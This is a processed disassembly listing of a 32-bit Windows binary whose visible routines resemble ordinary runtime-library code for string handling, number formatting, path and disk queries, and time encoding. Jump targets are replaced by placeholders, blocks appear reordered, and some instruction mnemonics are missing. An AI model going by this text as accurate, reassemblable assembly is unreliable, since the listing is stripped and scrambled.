test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_40862c
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40bda4
cmp al 0x2
jne r-xdata
dec edi
sub_408394
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_408344
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_40447c
pop edi
pop esi
pop ebx
retn
sub_4083cc
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_40441c
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_40404c
add esp 0x108
pop esi
pop ebx
retn
sub_408408
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404d00
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404d00
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_4084b8
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_4084e0
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea eax [ edi - 0x1 ]
pop esi
pop edi
retn
sub_40850c
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_408540
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_40421c
push eax
mov eax ebx
call sub_40441c
mov edx eax
mov eax esi
pop ecx
call sub_40850c
pop esi
pop ebx
retn
sub_408564
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_40441c
mov edx eax
mov ecx edi
mov eax ebx
call sub_40850c
pop edi
pop esi
pop ebx
retn
sub_408584
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_4085a8
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_4085e8
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408640
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_4086b4
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_40847c
mov esi eax
inc esi
mov eax esi
call sub_408694
mov ecx esi
mov edx ebx
call sub_4084a8
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_4086f0
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40bdc8
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_4084a8
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_40799c
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_408778
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408acf
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_40885a
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_4088a2
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_40885a
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_40876c
pop edx
or edx edx
je r-xdata
sub_40885a
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408acf
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4088a2
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408acf
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_4086f0
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_4088c9 ]
mov ebx ecx
sub cl 0x44
je sub_407eb4
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_404184
jmp r-xdata
mov esi sub_4041e4
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_407eb4
sub cl 0x44
je sub_407e48
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_407e48
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407eb4
mov ecx 0x10
cmp bl 0x58
je sub_407e48
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_408748
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_408c88
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407e48
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_408af0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_40847c
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_408778
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_408b30
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_40847c
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_408778
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_408b84
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_40421c
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_40421c
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_40421c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_408778
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_40404c
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_403f5c
mov eax esi
mov edx ebx
call sub_4045a8
mov eax [ ebp - 0x4 ]
call sub_40421c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_408778
mov edx esi
xchg edx eax
call sub_4045a8
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_408c44
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_408c88
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_408f5c
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_408d87
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_408d91
call sub_408d87
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408c44
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_408ded
call sub_408d87
call sub_408d7e
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_408d7e
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408c44
retn
xor ecx ecx
sub_408e29
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_408d7e
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_408d7e
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_408e8e
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_408ee2
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_408e29
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_408f5c
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_408f89
jmp r-xdata
call sub_4090ab
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_408f89
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402d80
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_4090ab
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_409188
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_40923f
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_40924a
neg edx
mov ecx esi
call sub_40924a
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_40923f
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_409266
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402d80
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_40924a
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_409266
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_40929c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_408c88
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40404c
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4092cc
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_408c88
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40404c
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_409318
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_40441c
mov edx esp
xor ecx ecx
call sub_409188
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409344
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_40441c
mov edx esp
xor ecx ecx
call sub_409188
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_40938c
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_4093d0
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_409440
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_40938c
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407980
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407980
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407980
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_40949c
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_4094d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
